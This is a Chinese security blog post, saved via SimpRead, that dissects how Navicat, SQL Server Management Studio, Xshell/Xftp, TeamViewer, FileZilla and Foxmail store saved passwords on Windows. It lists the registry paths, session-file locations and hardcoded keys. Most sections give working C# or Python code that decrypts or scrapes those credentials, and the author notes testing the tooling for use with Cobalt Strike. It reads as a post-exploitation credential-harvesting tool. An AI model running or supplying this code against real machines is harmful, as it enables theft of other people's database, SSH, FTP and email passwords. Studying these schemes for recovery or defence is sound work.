> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [rcoil.me](https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/)

> 这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。

发表于 2019-09-01 | 分类于 [编程之道](https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/) | 热度 ℃

这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。

[](#0x00-前言 "0x00 前言")0x00 前言
-----------------------------

在 `Windows` 系统下保存密码，无非就只存在于两个位置：**_注册表_**、**_文件_**。所以下文主要也是从注册表项、session 文件中获取相关加密后的密码字段。且文章中所涉及的知识点，出处全在文末来源参考中，本文仅仅是个人的理解及整合。

主要对以下几个程序进行解析

```
1、Navicat PremiumSoft
2、SQL Server Management Studio
3、Xmanager --> Xshell,Xftp
4、TeamView
5、FileZille
....
```

**PS:** 可以使用 [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) 监测进程的操作。

[](#0x01-Navicat-PremiumSoft "0x01 Navicat PremiumSoft")0x01 Navicat PremiumSoft
--------------------------------------------------------------------------------

​ `Navicat` 的 session 信息是保存在注册表中的。以 `MySql` 为例

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_16-34-53.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_16-34-53.png)

Navicat 中的 MySQL 配置（注册表路径）

​ 上图注册表中，保存着我们需要的 **_Host_**、**_UserName_**、**_PassWord_** 等字段。以下是数据库类型对应注册表路径表

<table><tbody><tr><th>数据库类型</th><th 184,="" 92)="">注册表路径</th></tr><tr><td>MySQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td>Microsoft SQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></tbody></table>

### [](#1-1-如何加密 "1.1 如何加密")1.1 如何加密

Navicat 使用 `Blowfish算法（河豚密码）`加密密码字符串。以下是 Navicat 所做的事情：

*   生成密钥

1.  Navicat 使用 SHA-1 算法生成 160 位密钥；
2.  对 `3DC5CA39` 字符串取其 `SHA-1摘要`，长度为 8 个字节，这字符串是 `Blowfish算法`中使用的密钥；
3.  确切的值是：
    
    ```
    byte[] Key = {
    	0x42, 0xCE, 0xB2, 0x71, 0xA5, 0xE4, 0x58, 0xB7, 0x4A, 0xEA, 0x93, 0x94,
    	0x79, 0x22, 0x35, 0x43, 0x91, 0x87, 0x33, 0x40
    };
    ```
    

*   初始化向量（IV）

1.  因为 `Blowfish算法`每次只能加密一个 **8 字节长的块**；
2.  所以开始时，Navicat 用 `0xFF` 填充一个 **8 字节长的块**，然后利用上面提到的 Key 进行 Blowfish 加密，得到 8 字节长的初始向量（IV）；
3.  确切的值是：
    
    ```
    byte[] IV = {
    	0xD9, 0xC7, 0xC3, 0xC8, 0x87, 0x0D, 0x64, 0xBD
    };
    ```
    

*   加密 rawPass 字符串

1.  **rawPass** 字符串是 ASCII 字符串，且不考虑 “NULL” 终止符。
2.  Navicat 使用管道来加密 **rawPass** 字符串。管道如下所示：

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/EncryptionPipeline.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/EncryptionPipeline.png)

Blowfish 加密

**_注意：_**每个明文块都是一个 8 字节长的块。只有当最后一个明文块不是 8 字节长时，才能执行上图中显示的最后一步。

### [](#1-2-加密过程（C-） "1.2 加密过程（C#）")1.2 加密过程（C#）

```
public string EncryptString(string plaintext)
        {
            byte[] plaintext_bytes = Encoding.UTF8.GetBytes(plaintext);

            byte[] CV = Enumerable.Repeat<byte>(0xFF, Blowfish.BlockSize).ToArray();
            blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);

            string ret = "";
            int blocks_len = plaintext_bytes.Length / Blowfish.BlockSize;
            int left_len = plaintext_bytes.Length % Blowfish.BlockSize;
            byte[] temp = new byte[Blowfish.BlockSize];
            for (int i = 0; i < blocks_len; ++i) {
                Array.Copy(plaintext_bytes, Blowfish.BlockSize * i, temp, 0, Blowfish.BlockSize);
                XorBytes(temp, CV, Blowfish.BlockSize);
                blowfishCipher.Encrypt(temp, Blowfish.Endian.Big);
                XorBytes(CV, temp, Blowfish.BlockSize);

                ret += ByteArrayToString(temp);
            }

            if (left_len != 0) {
                blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);
                XorBytes(CV,
                         plaintext_bytes.Skip(blocks_len * Blowfish.BlockSize).Take(left_len).ToArray(),
                         left_len);
                ret += ByteArrayToString(CV.Take(left_len).ToArray());
            }

            return ret;
}
```

### [](#1-3-解密过程 "1.3 解密过程")1.3 解密过程

```
public string DecryptString(string ciphertext) 
{
    byte[] ciphertext_bytes = StringToByteArray(ciphertext);

    byte[] CV = Enumerable.Repeat<byte>(0xFF, Blowfish.BlockSize).ToArray();
    blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);

    byte[] ret = new byte[0];
    int blocks_len = ciphertext_bytes.Length / Blowfish.BlockSize;
    int left_len = ciphertext_bytes.Length % Blowfish.BlockSize;
    byte[] temp = new byte[Blowfish.BlockSize];
    byte[] temp2 = new byte[Blowfish.BlockSize];
    for (int i = 0; i < blocks_len; ++i) {
        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * i, temp, 0, Blowfish.BlockSize);
        Array.Copy(temp, temp2, Blowfish.BlockSize);
        blowfishCipher.Decrypt(temp, Blowfish.Endian.Big);
        XorBytes(temp, CV, Blowfish.BlockSize);
        ret = ret.Concat(temp).ToArray();
        XorBytes(CV, temp2, Blowfish.BlockSize);
    }

    if (left_len != 0) {
        Array.Clear(temp, 0, temp.Length);
        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * blocks_len, temp, 0, left_len);
        blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);
        XorBytes(temp, CV, Blowfish.BlockSize);
        ret = ret.Concat(temp.Take(left_len).ToArray()).ToArray();
    }

    return Encoding.UTF8.GetString(ret);
}
```

**效果如下：**

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-27_12-48-37.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-27_12-48-37.png)

Navicat PremiumSoft 解密结果

[](#0x02-SSMS "0x02 SSMS")0x02 SSMS
-----------------------------------

​以 `session` 文件名及位置来划分，SSMS 可以分为 3 个大版本。（保存的文件都是标准的. net 二进制序列化文件）

<table><tbody><tr><th>Version</th><th 184,="" 92)="">Session File Path</th></tr><tr><td>SSMS 2005</td><td>%appdata%\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat</td></tr><tr><td>SSMS 2008</td><td>%appdata%\Microsoft\Microsoft SQL Server\100\Tools\Shell\SqlStudio.bin</td></tr><tr><td>SSMS Other</td><td>%appdata%\Microsoft\SQL Server Management Studio\xxxx\SqlStudio.bin</td></tr></tbody></table>

这章节，所要表达的内容在 [SQL Server Management Studio 密码导出工具](http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html) 当中已经分析得很详细了，故不多写。

**_PS：_**因为要加载私有程序集，故此程序无法在 `Cobalt Strike` 中使用，原因未知。

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_15-51-03.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_15-51-03.png)

SharpSSMSPwd 解密结果

[](#0x03-Xmanager "0x03 Xmanager")0x03 Xmanager
-----------------------------------------------

​ 有人问 session 文件里保存的密码是以什么方式保存的，被盗了后果是否很严重？  
官方给出了下面的答案

```
-What is the obfuscation algorithm?

It is not obfuscating password. Xshell uses RC4 with SHA256.
```

当然，这是 5.1 版本之后所使用的。

如今的 `Xmanager` 大致可分为 2 个大版本。版本名及产生的 `session` 文件位置如下：

<table><tbody><tr><th>产品</th><th 184,="" 92)="">会话文件位置</th></tr><tr><td>XShell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>XFtp 5</td><td>%userprofile%\Documents\NetSarang\Xftp\Sessions</td></tr><tr><td>XShell 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td>XFtp 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions</td></tr></tbody></table>

以下以 `XShell 6` 为例

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-22_09-27-08.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-22_09-27-08.png)

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-22_09-28-25.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-22_09-28-25.png)

### [](#3-1-如何加密 "3.1 如何加密")3.1 如何加密

​ 版本的不同，其加密方式也不一样。以下为默认设置下的加密行为。

*   **版本 < 5.1**
    
    `Xshell` 采用以字符串`!X@s#h$e%l^l&` 的 MD5 值作为作为 `RC4 加密算法`中的密钥，以下是加密实现：
    
    ```
    from hashlib import *
    from Crypto.Cipher import ARC4
    from base64 import *
    
    #MD5 = ba2d9b7e9cca73d152b26772662df55e
    cipher = ARC4.new(md5(b'!X@s#h$e%l^l&').digest())
    print(b64encode(cipher.encrypt(b'RcoIl')).decode())
    
    # +amcdP4=
    ```
    
    `Xftp` 同理，以 `!X@s#c$e%l^l&` 的 MD5 值作为密钥，与 Xshell 所使用的字符串仅一个字符之分。
    
    ```
    from hashlib import *
    from Crypto.Cipher import ARC4
    from base64 import *
    
    #MD5 = 306e9835de9291d227bb28b2f72dca33
    cipher = ARC4.new(md5(b'!X@s#c$e%l^l&').digest())
    print(b64encode(cipher.encrypt(b'RcoIl')).decode())
    
    # SvmUuQg=
    ```
    
*   **版本 = 5.1 or 5.2**
    
    `Xshell` 和 `Xftp` 都使用 `SHA-256 摘要算法`生成密钥，作为 `RC4 加密`中使用的密钥。
    
    以当前`用户账户的 SID` 作为 SHA-256 摘要，长度为 32 个字节的数组。SID 可通过 `whoami /user` 进行获取，如下所示：
    
    ```
    C:\Users\RcoIl>whoami /user
    
    用户信息
    ----------------
    
    用户名         SID
    ============== =============================================
    rcoil-pc\rcoil S-1-5-21-3990929841-153547143-3340509336-1001
    
    SHA-256: a6a7f87e9ab607e8ec70446569ff86919a55417c9259b8e866afb1403fb17a27
    
    byte[] Key = {
    	0xA6, 0xA7, 0xF8, 0x7E, 0x9A, 0xB6, 0x07, 0xE8, 0xEC, 0x70, 0x44, 0x65,
    	0x69, 0xFF, 0x86, 0x91, 0x9A, 0x55, 0x41, 0x7C, 0x92, 0x59, 0xB8, 0xE8,
    	0x66, 0xAF, 0xB1, 0x40, 0x3F, 0xB1, 0x7A, 0x27
    };
    ```
    
*   **版本 > 5.2**
    
    而 5.2 版本之后的 `Xshell` 与 `Xftp`，与之前只是多加了一个用户名。如
    
    ```
    #user+sid
    RcoIlS-1-5-21-3990929841-153547143-3340509336-1001
    
    SHA-256: 5e53a13c5e98d02f8100ce62deb6e0dfec2a2361ba3c7fdd84dceb00554264bb
    
    byte[] Key = {
    	0x5E, 0x53, 0xA1, 0x3C, 0x5E, 0x98, 0xD0, 0x2F, 0x81, 0x00, 0xCE, 0x62,
    	0xDE, 0xB6, 0xE0, 0xDF, 0xEC, 0x2A, 0x23, 0x61, 0xBA, 0x3C, 0x7F, 0xDD,
    	0x84, 0xDC, 0xEB, 0x00, 0x55, 0x42, 0x64, 0xBB
    };
    ```
    
*   设置了 Master Key 的情况下（5.1 版本之后）
    
    如果设置了 主密码，则以主密码的 `SHA-256摘要`作为 `RC4 加密`中使用的密钥。例如：
    
    ```
    Master Key:yingyingying
    byte[] Key = {
    	0x5E, 0xF9, 0xB6, 0x86, 0xF8, 0xE1, 0xCE, 0x51, 0xCB, 0xCD, 0xCB, 0x2F,
    	0xC7, 0x2B, 0x33, 0xB4, 0x3B, 0x17, 0xF3, 0xE6, 0xE9, 0x40, 0x23, 0x65,
    	0x4C, 0x68, 0xF0, 0xB7, 0xEC, 0xD6, 0x59, 0xF5
    };
    ```
    

### [](#3-2-加密过程（C-） "3.2 加密过程（C#）")3.2 加密过程（C#）

​ 假设我们的密码是 `root`，则它的 `SHA-256 摘要`将作为附加加密数据。

```
byte[] Key = {
	0x48, 0x13, 0x49, 0x4D, 0x13, 0x7E, 0x16, 0x31, 0xBB, 0xA3, 0x01, 0xD5,
	0xAC, 0xAB, 0x6E, 0x7B, 0xB7, 0xAA, 0x74, 0xCE, 0x11, 0x85, 0xD4, 0x56,
	0x56, 0x5E, 0xF5, 0x1D, 0x73, 0x76, 0x77, 0xB2
};
```

*   **_Python 版本_**
    
    ```
    from base64 import b64encode, b64decode
    from Crypto.Hash import MD5, SHA256
    from Crypto.Cipher import ARC4
    
    UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"
    rawPass = "root"
    cipher = ARC4.new(SHA256.new(UserSid).digest())
    checksum = SHA256.new(rawPass).digest()
    ciphertext = cipher.encrypt(rawPass)
    print b64encode(ciphertext + checksum).decode()
    
    ==》 klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney
    ```
    

### [](#3-3-解密过程（C-） "3.3 解密过程（C#）")3.3 解密过程（C#）

*   **_Python 版本_**
    
    ```
    from base64 import b64encode, b64decode
    from Crypto.Hash import MD5, SHA256
    from Crypto.Cipher import ARC4
    
    UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"
    rawPass = "klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"
    data = b64decode(rawPass)
    Cipher = ARC4.new(SHA256.new((UserSid).encode()).digest())
    ciphertext, checksum = data[:-SHA256.digest_size], data[-SHA256.digest_size:]
    plaintext = Cipher.decrypt(ciphertext)
    print plaintext.decode()
    ```
    
*   **_C# 版本_**
    
    ```
    string UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001";
    string rawPass = "klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney";
    
    byte[] data = Convert.FromBase64String(rawPass);
    
    byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(UserSid));
    
    byte[] passData = new byte[data.Length - 0x20];
    Array.Copy(data, 0, passData, 0, data.Length - 0x20);
    byte[] decrypted = RC4Crypt.Decrypt(Key, passData);
    
    Console.WriteLine("Decrypt: {0}", Encoding.ASCII.GetString(decrypted));
    
     ==》 Decrypt: root
    ```
    

**结果如下所示：**

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_09-32-36.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_09-32-36.png)

以上所有测试均为工作组环境，因为在域环境解密失败，原因未知。

[](#0x04-TeamView "0x04 TeamView")0x04 TeamView
-----------------------------------------------

直接是通过获取 `TeamView` 的句柄，把窗体上所有控件的变量给读出来。

```
public static bool EnumFunc(IntPtr hWnd, IntPtr lParam)
{
    StringBuilder sb = new StringBuilder(256);
    const int WM_GETTEXT = 0x0D;
    GetClassNameW(hWnd, sb, sb.Capacity);
    if (sb.ToString() == "Edit" || sb.ToString() == "Static")
    {
        WindowInfo wnd = new WindowInfo();
        wnd.hWnd = hWnd;
        wnd.szClassName = sb.ToString();
        if (wnd.szClassName == "Edit")
        {
            StringBuilder stringBuilder = new StringBuilder(256);
            SendMessage(hWnd, WM_GETTEXT, 256, stringBuilder);
            wnd.szWindowName = stringBuilder.ToString();
        }
        else
        {
            GetWindowTextW(hWnd, sb, sb.Capacity);
            wnd.szWindowName = sb.ToString();
        }
        //Console.WriteLine("句柄=" + wnd.hWnd.ToString().PadRight(20) + " 类型=" + wnd.szClassName.PadRight(20) + " 名称=" + wnd.szWindowName);
        //add it into list
        wndList.Add(wnd);
    }
    return true;
}
```

为了其兼容性，不对结果进行筛选，输出全部窗体内容信息

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_14-40-13.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-23_14-40-13.png)

[](#0x05-FileZilla "0x05 FileZilla")0x05 FileZilla
--------------------------------------------------

从网上收集的信息得到：

*   在 `Filezilla 2.X` 版本中，密码正在进行异或处理并存储在 Registry 中;
    
*   在 `Filezilla 3.x` 版本中，密码以明文形式存储在 `.xml文件`中。
    
    如今官方的最新版本为 `FileZilla_3.44.2_win64_sponsored-setup`，以此版本进行测试：
    
    [![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-26_09-47-20.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-26_09-47-20.png)
    

​ 直接读取 相关 xml 的内容即可（**_recentservers.xml_**）

```
public static void fileZilla()
        {
            string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");
            try
            {
                if (File.Exists(FzPath))
                {
                    try
                    {
                        var objXmlDocument = new XmlDocument();
                        objXmlDocument.Load(FzPath);
                        Console.WriteLine("{0,-20}{1,-8}{2,-15}{3,-15}", "Host", "Port", "Username", "ratPass");
                        foreach (XmlElement XE in ((XmlElement)objXmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
                        {
                            var Host = XE.GetElementsByTagName("Host")[0].InnerText;
                            var Port = XE.GetElementsByTagName("Port")[0].InnerText;
                            var User = XE.GetElementsByTagName("User")[0].InnerText;
                            var Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText)));
                            if (!string.IsNullOrEmpty(Host) && !string.IsNullOrEmpty(Port) && !string.IsNullOrEmpty(User) && !string.IsNullOrEmpty(Pass))
                            {
                                Console.WriteLine("{0,-20}{1,-8}{2,-15}{3,-15}", Host, Port, User, Pass);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
```

​ 效果如下

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-26_10-17-43.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-08-26_10-17-43.png)

[](#0x06-Foxmail "0x06 Foxmail")0x06 Foxmail
--------------------------------------------

`Foxmail` 将输入的密码和一个固定字符串做异或加密，然后在前面添加字符串 `Password` ，用于标记作用。

<table><tbody><tr><th>版本号</th><th>存储文件</th><th 184,="" 92)="">固定异或字符串 (加密密钥)</th></tr><tr><td>Version 6.X</td><td>Account.stg -v6.5</td><td>~draGon~ 第一位异或值：5A</td></tr><tr><td>Version 7.X</td><td>Accounts.tdat -v7.0 Account.rec0 -v7.1</td><td>~F@7％m$~ 第一位异或值：71</td></tr></tbody></table>

至于为什么是这个值，可以直接逆向查看，或者看看这篇文章 [foxmail 邮箱密码密码原理和方法研究](https://wenku.baidu.com/view/1fcaf49cda38376baf1faeff)。

**Foxmail Version 6.x 加密方法：**

*   将原密文的第一位 16 进制与 `5A` 进行 `XOR异或` 操作，然后替换掉原密文的第一位后，得到一个新密文
    
    ```
    5A 的由来
    string key = "~draGon~";
    byte[] data = Encoding.Default.GetBytes(key);
    int x = 0;
    for(int i = 0; i < data.Length; i++)
    {
    	x += int.Parse(data[i].ToString());
    }
    x %= 255;
    Console.WriteLine(x); // 90 => 5A
    ```
    
*   再将新密文从第二位开始分别与密钥 `~draGon~`（7E647261476F6E7E）进行 `XOR异或`，并将此时得到的密文与原密文进行相减，得到明文的 16 进制。
    
*   `Account.stg` 文件使用二进制格式存储并在前 `0x800 字节`内填充了一些十六进制数据，之后才是真正的账户信息，包括 POP3 和 SMTP 账户、密码。
    
*   POP3 和 SMTP 账户密码分别用 “POP3Password” 和 “ESMTPPassword” 来代表。密码使用十六进制格式并用 XOR 异或加密，密钥为 “~draGon~”。
    

**版本 7.X 同理。**

```
/// <summary>
        /// Foxmail password decoder
        /// Credit: Jacob Soo
        /// https://github.com/jacobsoo/FoxmailRecovery/blob/c3263424dd961ec23868d03c9caad13fa5c017ee/Foxmail%20Password%20Recovery/Foxmail%20Password%20Recovery/SharedFunctions.cs#L72
        /// https://github.com/lim42snec/foxmaildump/blob/ca29edc6d767b4e52ee939cdad1d0f8cd7c9f626/FoxmailDump.cpp#L34
        /// </summary>
        /// <param >版本号</param>
        /// <param >密文</param>
        /// <returns></returns>
        public static String decodePW(int ver, String strHash)
        {
            String decodedPW = "";
            // 第一步：定义不同版本的秘钥
            int[] a;
            // fc0 的值是根据版本密钥，以字节为单位将16进制密文转成10进制，十进制之和求余。（x %=255;）
            int fc0;

            if (ver == 0) // Version 6
            {
                int[] v6a = { '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' };
                a = v6a;
                fc0 = Convert.ToInt32("5A", 16); //90
            }
            else // Version 7
            {
                int[] v7a = { '~', 'F', '@', '7', '%', 'm', '$', '~' };
                a = v7a;
                fc0 = Convert.ToInt32("71", 16); // 113
            }

            // 第二步：以字节为单位将16进制密文转成10进制
            int size = strHash.Length / 2; 
            int index = 0;
            int[] b = new int[size];
            for (int i = 0; i < size; i++)
            {
                
                b[i] = Convert.ToInt32(strHash.Substring(index, 2), 16);
                index = index + 2;
            }

            // 第三步：将第一个元素替换成与指定数异或后的结果
            int[] c = new int[b.Length];

            c[0] = b[0] ^ fc0;

            Array.Copy(b, 1, c, 1, b.Length - 1);

            // 第四步：不断扩容拷贝自身
            while (b.Length > a.Length)
            {
                int[] newA = new int[a.Length * 2];
                Array.Copy(a, 0, newA, 0, a.Length);
                Array.Copy(a, 0, newA, a.Length, a.Length);
                a = newA;
            }

            int[] d = new int[b.Length];

            for (int i = 1; i < b.Length; i++)
            {
                d[i - 1] = b[i] ^ a[i - 1];
            }

            int[] e = new int[d.Length];

            for (int i = 0; i < d.Length - 1; i++)
            {
                if (d[i] - c[i] < 0)
                {
                    e[i] = d[i] + 255 - c[i];
                }

                else
                {
                    e[i] = d[i] - c[i];
                }

                decodedPW += (char)e[i];
            }

            return decodedPW;
        }
```

到目前为止，此版本支持 6.5 至 7.2 版的数据恢复，但是这里只是测试了 7.2 版本，效果如下

[![](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-10-11_17-49-10.png)](https://rcoil.me/image/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/blog_2019-10-11_17-49-10.png)

[](#来源参考 "来源参考")来源参考
--------------------

[https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password](https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password)  
[SQL Server Management Studio 密码导出工具](http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html)  
[https://github.com/zcgonvh/SSMSPwd](https://github.com/zcgonvh/SSMSPwd)  
[https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password](https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password)  
[https://cloud.tencent.com/developer/news/261135](https://cloud.tencent.com/developer/news/261135)  
[https://www.t00ls.net/viewthread.php?tid=51996&extra=&highlight=teamview&page=1](https://www.t00ls.net/viewthread.php?tid=51996&extra=&highlight=teamview&page=1)

[![](https://rcoil.me/images/%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83.jpeg)](https://rcoil.me/images/%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83.jpeg)

！坚持技术分享，您的支持将鼓励我继续创作！